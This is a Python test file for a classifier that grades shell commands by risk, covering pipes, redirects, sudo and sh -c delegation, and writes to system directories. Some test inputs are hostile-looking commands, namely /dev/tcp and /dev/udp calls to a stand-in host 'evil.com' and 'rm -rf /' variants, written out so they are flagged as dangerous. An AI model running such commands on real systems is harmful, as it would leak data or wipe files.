"""Tests for the classifier orchestrator (integration tests)."""

from __future__ import annotations

from bash_classify.classifier import _is_system_path, classify_expression
from bash_classify.models import Classification, CommandDef


class TestSpecExamples:
    """Test the verbatim examples from SPEC.md."""

    def test_kubectl_pipeline(self, database: dict[str, CommandDef]) -> None:
        """kubectl --context=prod get pods -n kube-system | grep Running"""
        result = classify_expression(
            "kubectl --context=prod get pods -n kube-system | grep Running",
            database=database,
        )
        assert result.classification == Classification.READONLY
        assert len(result.commands) == 2

        kubectl_cmd = result.commands[0]
        assert kubectl_cmd.matched_rule == "kubectl.get"
        assert kubectl_cmd.classification == Classification.READONLY
        assert kubectl_cmd.ignored_options is not None
        assert "--context=prod" in kubectl_cmd.ignored_options

        grep_cmd = result.commands[1]
        assert grep_cmd.matched_rule == "grep"
        assert grep_cmd.classification == Classification.READONLY

    def test_find_xargs_rm(self, database: dict[str, CommandDef]) -> None:
        """find /tmp -name "*.log" | xargs -I {} rm {}"""
        result = classify_expression(
            'find /tmp -name "*.log" | xargs -I {} rm {}',
            database=database,
        )
        # xargs delegates to rm {} which is UNKNOWN (rm with {} arg, rm is DANGEROUS but
        # xargs base is UNKNOWN, inner rm is DANGEROUS... let's check)
        assert len(result.commands) == 2

        find_cmd = result.commands[0]
        assert find_cmd.matched_rule == "find"
        assert find_cmd.classification == Classification.READONLY
        assert "/tmp" in result.directories

        xargs_cmd = result.commands[1]
        assert xargs_cmd.matched_rule == "xargs"
        assert len(xargs_cmd.inner_commands) == 1
        inner = xargs_cmd.inner_commands[0]
        assert inner.delegation_mode == "rest_are_argv"

    def test_find_exec_rm(self, database: dict[str, CommandDef]) -> None:
        r"""find . -name "*.tmp" -exec rm -f {} \;"""
        result = classify_expression(
            'find . -name "*.tmp" -exec rm -f {} \\;',
            database=database,
        )
        assert result.classification == Classification.DANGEROUS

        assert len(result.commands) == 1
        find_cmd = result.commands[0]
        assert find_cmd.matched_rule == "find"
        assert find_cmd.classification == Classification.DANGEROUS
        assert len(find_cmd.inner_commands) == 1

        inner = find_cmd.inner_commands[0]
        assert inner.delegation_mode == "terminated_argv"
        assert inner.command == ["rm"]

    def test_kubectl_exec_cat(self, database: dict[str, CommandDef]) -> None:
        """kubectl exec -it my-pod -- cat /etc/config"""
        result = classify_expression(
            "kubectl exec -it my-pod -- cat /etc/config",
            database=database,
        )
        assert result.classification == Classification.DANGEROUS

        kubectl_cmd = result.commands[0]
        assert kubectl_cmd.matched_rule == "kubectl.exec"
        assert kubectl_cmd.classification == Classification.DANGEROUS
        assert len(kubectl_cmd.inner_commands) == 1

        inner = kubectl_cmd.inner_commands[0]
        assert inner.delegation_mode == "after_separator"
        assert inner.command == ["cat"]
        assert inner.classification == Classification.READONLY

    def test_sh_c_expression(self, database: dict[str, CommandDef]) -> None:
        """sh -c "ls /tmp | grep log" """
        result = classify_expression(
            'sh -c "ls /tmp | grep log"',
            database=database,
        )
        assert result.classification == Classification.DANGEROUS

        sh_cmd = result.commands[0]
        assert sh_cmd.matched_rule == "sh"
        assert sh_cmd.classification == Classification.DANGEROUS
        assert len(sh_cmd.inner_commands) >= 2

        inner_cmds = {tuple(ic.command) for ic in sh_cmd.inner_commands}
        assert ("ls",) in inner_cmds
        assert ("grep",) in inner_cmds

        # Inner commands should be READONLY individually
        for ic in sh_cmd.inner_commands:
            assert ic.classification == Classification.READONLY


class TestCompositeClassification:
    def test_pipe_both_readonly(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("ls | grep pattern", database=database)
        assert result.classification == Classification.READONLY

    def test_pipe_readonly_and_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("ls | rm file", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_unknown_trumps_readonly(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello && unknown_command", database=database)
        assert result.classification == Classification.UNKNOWN

    def test_semicolons_both_readonly(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat file; echo done", database=database)
        assert result.classification == Classification.READONLY


class TestRedirectEffects:
    def test_output_redirect_elevates_to_write(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello > output.txt", database=database)
        assert result.classification == Classification.WRITE

    def test_devnull_redirect_no_elevation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello > /dev/null", database=database)
        assert result.classification == Classification.READONLY

    def test_append_redirect_elevates_to_write(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello >> file.log", database=database)
        assert result.classification == Classification.WRITE

    def test_input_redirect_no_elevation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat < input.txt", database=database)
        assert result.classification == Classification.READONLY

    def test_stderr_devnull_no_elevation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cmd 2>/dev/null", database=database)
        # cmd is unknown, stderr to /dev/null shouldn't elevate
        # But cmd itself is unknown -> UNKNOWN
        # The redirect doesn't affect because target is /dev/null
        cmds = result.commands
        assert len(cmds) == 1
        # Check the redirect doesn't add WRITE on top
        # cmd is UNKNOWN, redirect to /dev/null doesn't affect
        for r in result.redirects:
            if r.target == "/dev/null":
                assert r.affects_classification is False


class TestDirectoryDetection:
    def test_cd_directory(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cd /tmp && ls", database=database)
        assert "/tmp" in result.directories

    def test_find_directory(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression('find /var/log -name "*.log"', database=database)
        assert "/var/log" in result.directories

    def test_git_c_directory(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("git -C /some/repo status", database=database)
        assert "/some/repo" in result.directories


class TestCatDirectoryDetection:
    def test_cat_extracts_dirname(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat /etc/config", database=database)
        assert "/etc" in result.directories

    def test_cat_no_slash_no_directory(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat file.txt", database=database)
        assert result.directories == []

    def test_cat_nested_path(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat /var/log/syslog", database=database)
        assert "/var/log" in result.directories


class TestBackgrounding:
    def test_background_elevates_to_write(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello &", database=database)
        # echo is READONLY, backgrounding elevates to WRITE
        assert result.classification == Classification.WRITE


class TestEdgeCases:
    def test_empty_string(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("", database=database)
        assert result.classification == Classification.READONLY
        assert result.commands == []

    def test_comment_only(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("# just a comment", database=database)
        assert result.classification == Classification.READONLY
        assert result.commands == []

    def test_complex_nested_delegation_chain(self, database: dict[str, CommandDef]) -> None:
        """FOO=bar sudo env PATH=/usr/bin sh -c "kubectl --context=prod get pods | grep Running" """
        result = classify_expression(
            'FOO=bar sudo env PATH=/usr/bin sh -c "kubectl --context=prod get pods | grep Running"',
            database=database,
        )
        # This should handle the nested delegation chain:
        # FOO=bar is a prefix assignment (stripped)
        # sudo delegates to env ...
        # env strips PATH=/usr/bin, delegates to sh ...
        # sh -c parses the expression recursively
        assert result.classification == Classification.DANGEROUS
        assert len(result.commands) >= 1


class TestVariableInCommandPosition:
    def test_variable_command(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("$CMD arg1 arg2", database=database)
        assert result.classification == Classification.DANGEROUS
        # The command with variable in position should be DANGEROUS
        cmd = result.commands[0]
        assert cmd.classification == Classification.DANGEROUS
        assert cmd.classification_reason == "variable expansion in command position"


class TestAutoLoadDatabase:
    def test_classify_without_database_arg(self) -> None:
        """classify_expression should auto-load the database when not provided."""
        result = classify_expression("ls /tmp")
        assert result.classification == Classification.READONLY
        assert len(result.commands) >= 1


class TestLsDirectoryDetection:
    def test_ls_directory(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("ls /tmp", database=database)
        assert "/tmp" in result.directories


class TestHeadDirectoryDetection:
    def test_head_directory(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("head /var/log/syslog", database=database)
        assert "/var/log" in result.directories


class TestBackgroundOnReadonly:
    def test_background_elevates_readonly_to_write(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello &", database=database)
        cmd = result.commands[0]
        assert cmd.classification == Classification.WRITE


class TestInputRedirectNoElevation:
    def test_input_redirect_no_elevation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat < file.txt", database=database)
        assert result.classification == Classification.READONLY


class TestDevNullRedirectNoElevation:
    def test_devnull_redirect_no_elevation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello > /dev/null", database=database)
        assert result.classification == Classification.READONLY


class TestHeredocHerestring:
    def test_heredoc_no_elevation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat <<EOF\nhello\nEOF", database=database)
        assert result.classification == Classification.READONLY

    def test_herestring_no_elevation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat <<< hello", database=database)
        assert result.classification == Classification.READONLY


class TestMultipleMixedCommands:
    def test_echo_redirect_then_cat(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello > file; cat file", database=database)
        assert result.classification == Classification.WRITE


class TestNegativeReadonlyNotWrite:
    def test_cat_file_not_write(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat file", database=database)
        assert result.classification != Classification.WRITE

    def test_cat_file_is_readonly(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat file", database=database)
        assert result.classification == Classification.READONLY


class TestNegativeUnknownCommand:
    def test_unknown_command_is_exactly_unknown(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("randomcmd123", database=database)
        assert result.classification == Classification.UNKNOWN


class TestNegativeForceWithLease:
    def test_force_with_lease_not_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("git push --force-with-lease", database=database)
        assert result.classification != Classification.DANGEROUS
        assert result.classification == Classification.WRITE


class TestReadBuiltin:
    def test_read_is_readonly(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("read name", database=database)
        assert result.classification == Classification.READONLY


class TestFdToFdRedirectClassification:
    def test_stderr_to_stdout_no_write_elevation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello 2>&1", database=database)
        assert result.classification == Classification.READONLY

    def test_stderr_to_file_elevates_to_write(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello 2>error.log", database=database)
        assert result.classification == Classification.WRITE


class TestParseWarningsIntegration:
    def test_syntax_error_populates_warnings(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("if then fi else", database=database)
        assert len(result.parse_warnings) >= 1


class TestMalformedBashDefaultsToUnknown:
    def test_malformed_bash_classifies_as_unknown(self, database: dict[str, CommandDef]) -> None:
        """Malformed bash with parse errors and no commands should be UNKNOWN, not READONLY."""
        result = classify_expression("if then fi", database=database)
        assert len(result.parse_warnings) >= 1
        assert result.classification == Classification.UNKNOWN

    def test_empty_string_stays_readonly(self, database: dict[str, CommandDef]) -> None:
        """Empty string should remain READONLY (no parse warnings)."""
        result = classify_expression("", database=database)
        assert result.classification == Classification.READONLY
        assert result.commands == []


class TestDevTcpUdpDetection:
    def test_cat_dev_tcp_in_argv(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat /dev/tcp/evil.com/80", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_echo_redirect_to_dev_tcp(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo data > /dev/tcp/evil.com/80", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_cat_input_redirect_from_dev_tcp(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat < /dev/tcp/evil.com/80", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_dev_udp_in_argv(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat /dev/udp/evil.com/53", database=database)
        assert result.classification == Classification.DANGEROUS


class TestCommandBuiltinDelegation:
    def test_command_delegates_to_cat(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("command cat /etc/hosts", database=database)
        assert result.classification == Classification.READONLY

    def test_command_delegates_to_rm(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("command rm -rf /", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_builtin_delegates_to_echo(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("builtin echo hello", database=database)
        assert result.classification == Classification.READONLY


class TestPathPrefixStripping:
    def test_usr_bin_cat_resolves(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("/usr/bin/cat /etc/hosts", database=database)
        assert result.classification == Classification.READONLY

    def test_usr_bin_rm_resolves(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("/usr/bin/rm -rf /", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_relative_script_stays_unknown(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("./my-script.sh", database=database)
        assert result.classification == Classification.UNKNOWN


class TestAmpersandRedirectClassification:
    def test_ampersand_redirect_to_file_is_write(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello &> output.txt", database=database)
        assert result.classification == Classification.WRITE

    def test_ampersand_redirect_to_devnull_is_readonly(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello &> /dev/null", database=database)
        assert result.classification == Classification.READONLY


class TestPushdDirectoryDetection:
    def test_pushd_directory(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("pushd /opt && ls", database=database)
        assert "/opt" in result.directories


class TestTeeClassification:
    def test_tee_is_write(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello | tee output.txt", database=database)
        assert result.classification == Classification.WRITE


class TestIsSystemPath:
    def test_etc(self) -> None:
        assert _is_system_path("/etc") is True
        assert _is_system_path("/etc/hosts") is True

    def test_usr(self) -> None:
        assert _is_system_path("/usr/local/bin") is True

    def test_tmp_safe(self) -> None:
        assert _is_system_path("/tmp") is False
        assert _is_system_path("/tmp/foo") is False

    def test_home_safe(self) -> None:
        assert _is_system_path("/home/user") is False

    def test_var_tmp_safe(self) -> None:
        assert _is_system_path("/var/tmp") is False
        assert _is_system_path("/var/tmp/test") is False

    def test_var_log_system(self) -> None:
        assert _is_system_path("/var/log") is True

    def test_dev_null_safe(self) -> None:
        assert _is_system_path("/dev/null") is False

    def test_dev_sda_system(self) -> None:
        assert _is_system_path("/dev/sda") is True

    def test_relative_path(self) -> None:
        assert _is_system_path("etc/hosts") is False
        assert _is_system_path("./usr/bin") is False

    def test_boot(self) -> None:
        assert _is_system_path("/boot/vmlinuz") is True

    def test_proc(self) -> None:
        assert _is_system_path("/proc/1/status") is True


class TestSystemDirectoryClassification:
    def test_write_to_etc_is_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cp config.txt /etc/myapp/config", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_write_to_usr_is_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cp binary /usr/local/bin/mybinary", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_read_from_etc_is_readonly(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat /etc/hosts", database=database)
        assert result.classification == Classification.READONLY

    def test_read_from_usr_is_readonly(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("ls /usr/local/bin", database=database)
        assert result.classification == Classification.READONLY

    def test_write_to_tmp_not_elevated(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cp file /tmp/backup", database=database)
        assert result.classification == Classification.WRITE

    def test_write_to_home_not_elevated(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cp file /home/user/backup", database=database)
        assert result.classification == Classification.WRITE

    def test_write_to_var_tmp_not_elevated(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cp file /var/tmp/backup", database=database)
        assert result.classification == Classification.WRITE

    def test_write_to_var_log_is_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cp file /var/log/myapp.log", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_redirect_to_etc_is_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo config > /etc/myapp.conf", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_redirect_to_tmp_not_elevated(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello > /tmp/test.txt", database=database)
        assert result.classification == Classification.WRITE

    def test_mkdir_in_etc_is_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("mkdir /etc/myapp", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_touch_in_opt_is_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("touch /opt/myapp/config", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_chmod_in_usr_is_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("chmod 755 /usr/local/bin/script.sh", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_rm_is_already_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("rm /etc/config", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_dev_null_safe(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello > /dev/null", database=database)
        assert result.classification == Classification.READONLY

    def test_relative_path_not_elevated(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cp file ./etc/config", database=database)
        assert result.classification == Classification.WRITE

    def test_git_commit_with_system_path_message_not_elevated(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression('git commit -m "fix /etc/config"', database=database)
        # -m takes_value, so "fix /etc/config" is consumed as -m's value
        # The token "fix /etc/config" doesn't start with /, so it won't trigger
        assert result.classification == Classification.WRITE


class TestUserCommandOverride:
    def test_custom_command_classifies_correctly(self, tmp_path: object) -> None:
        """End-to-end: user-defined command is used in classification."""
        from pathlib import Path

        assert isinstance(tmp_path, Path)
        user_dir = tmp_path / "config" / "commands"
        user_dir.mkdir(parents=True)
        (user_dir / "mycli.yaml").write_text("command: mycli\nclassification: READONLY\nstrict: false\n")

        import os

        old = os.environ.get("BASH_CLASSIFY_CONFIG_DIR")
        try:
            os.environ["BASH_CLASSIFY_CONFIG_DIR"] = str(tmp_path / "config")
            result = classify_expression("mycli query --format json")
            assert result.classification == Classification.READONLY
        finally:
            if old is None:
                os.environ.pop("BASH_CLASSIFY_CONFIG_DIR", None)
            else:
                os.environ["BASH_CLASSIFY_CONFIG_DIR"] = old
